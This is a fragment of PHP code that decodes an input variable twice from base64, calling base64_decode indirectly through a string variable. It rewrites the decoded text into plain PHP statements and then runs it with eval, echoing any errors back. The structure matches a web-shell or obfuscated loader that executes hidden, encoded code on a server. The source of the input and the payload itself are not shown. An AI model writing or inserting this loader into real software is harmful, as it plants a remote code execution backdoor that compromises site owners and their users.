    $fn = 'base64_decode';
    $s1 = $fn($z);
    if ($s1 === false) { throw new Exception('First base64 decode failed'); }
    $s2 = $fn($s1);
    if ($s2 === false) { throw new Exception('Second base64 decode failed'); }
    $tokens = token_get_all($s2);
    $smartCode = '';
    $inEcho = false;
    foreach ($tokens as $t) {
        if (is_array($t)) {
            switch ($t[0]) {
                case T_OPEN_TAG:
                case T_CLOSE_TAG:
                    break;
                case T_OPEN_TAG_WITH_ECHO:
                    $smartCode .= 'echo (';
                    $inEcho = true;
                    break;
                case T_INLINE_HTML:
                    $smartCode .= 'echo ' . var_export($t[1], true) . ';';
                    break;
                default:
                    $smartCode .= $t[1];
            }
        } else {
            if ($inEcho && trim($t) === ';') {
                $smartCode .= ');';
                $inEcho = false;
            } else {
                $smartCode .= $t;
            }
        }
    }
    eval($smartCode);
} catch (\ParseError $e) {
    echo "Syntax error: ".$e->getMessage();
} catch (\Throwable $e) {
    echo "Runtime error: ".$e->getMessage();
}
                        
